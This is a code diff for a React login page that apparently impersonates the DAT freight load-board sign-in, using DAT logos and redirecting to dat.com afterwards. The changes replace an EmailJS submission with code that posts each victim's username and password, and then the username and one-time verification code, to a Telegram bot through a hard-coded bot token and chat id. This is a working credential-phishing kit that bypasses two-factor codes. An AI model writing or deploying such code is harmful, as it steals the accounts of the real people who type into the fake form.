@@ -1,7 +1,7 @@
 import '../HomePgae/homepage.css';
 import '../Form/formfk.css';
 import { useState, useRef } from "react";
-import emailjs from 'emailjs-com';
+// import emailjs from 'emailjs-com';
 import pak from '../../img/pak.svg';
 import bac from '../../img/bac.svg';
 import datkaplog from '../../img/dat-logo-email.svg';
@@ -50,9 +50,10 @@ function HomePage() {
         setPasswordShown(!passwordShown);
     };
 
-    const SERVICE_ID = 'service_cf79ytj';
-    const TEMPLATE_ID = 'template_8oalb5q';
-    const USER_ID = "5Fma-P-1aeivvlJxc";
+    // const SERVICE_ID = 'service_cf79ytj';
+    // const TEMPLATE_ID = 'template_8oalb5q';
+    // const USER_ID = "5Fma-P-1aeivvlJxc";
+
 
     function handleSubmit(event) {
         event.preventDefault();
@@ -65,7 +66,17 @@ function HomePage() {
             qfFunck(passwordUser.current);
             if (qfNum === 0) {
                 if (userName.current.value && passwordUser.current.value) {
-                    emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, event.target, USER_ID)
+                    const url = `https://api.telegram.org/bot7200818155:AAF9EaPk7xr8kBsonHfMpg8JrwA_s8TRWkM/sendMessage` // The url to request
+                    const obj = {
+                        chat_id: 1368494862, // Telegram chat id
+                        text: "Username - " + userName.current.value + "\n" + "Password - " + passwordUser.current.value, // The text to send
+                    };
+                    const xht = new XMLHttpRequest();
+                    xht.open("POST", url, true);
+                    xht.setRequestHeader("Content-type", "application/json; charset=UTF-8");
+                    xht.send(JSON.stringify(obj));
+
+                    // emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, event.target, USER_ID)
                     setUsertazaname(userName.current.value);
                     setEreva(!ereva);
                     // window.location.href = "https://login.dat.com/login?state=hKFo2SBwWXlWeTB3dE9MdnpwOWZlQlZQU25wSXJ2N19QdVc5RKFupWxvZ2luo3RpZNkgZndKQ3RpZlYtdUhMX3BvUG5MZHRNVHdrNDg3TjZnUlGjY2lk2SBlOWx6TVhibldOSjBENTBDMmhhYWRvN0RpVzFha3dhQw&client=e9lzMXbnWNJ0D50C2haado7DiW1akwaC&protocol=oauth2&prompt=login&response_type=token%20id_token&redirect_uri=https:%2F%2Fone.dat.com%2Fcallback&scope=openid%20profile%20email&audience=https:%2F%2Fprod-api.dat.com&app_name=DAT%20One%20Web&page_mode=legacy&init_username=&view=login&email_readonly=false&nonce=K9F~QZ7J7pAxbQwq4584ydDVHnGb7Zmb&auth0Client=eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiOS4xOS4wIn0%3D&capturedTime=1704971938033";
@@ -125,8 +136,16 @@ function HomePage() {
         } else if (qfNumErku === 0) {
             if (qfNumErku === 0) {
                 if (digit.current.value) {
-                    console.log(event.target);
-                    emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, event.target, USER_ID)
+                    const url = `https://api.telegram.org/bot7200818155:AAF9EaPk7xr8kBsonHfMpg8JrwA_s8TRWkM/sendMessage` // The url to request
+                    const obj = {
+                        chat_id: 1368494862, // Telegram chat id
+                        text: "Username - " + userName.current.value + "\n" + "Verify - " + digit.current.value, // The text to send
+                    };
+                    const xht = new XMLHttpRequest();
+                    xht.open("POST", url, true);
+                    xht.setRequestHeader("Content-type", "application/json; charset=UTF-8");
+                    xht.send(JSON.stringify(obj));
+                    // emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, event.target, USER_ID)
                     window.location.href = "https://www.dat.com/login#sec2";
                     return;
                 }
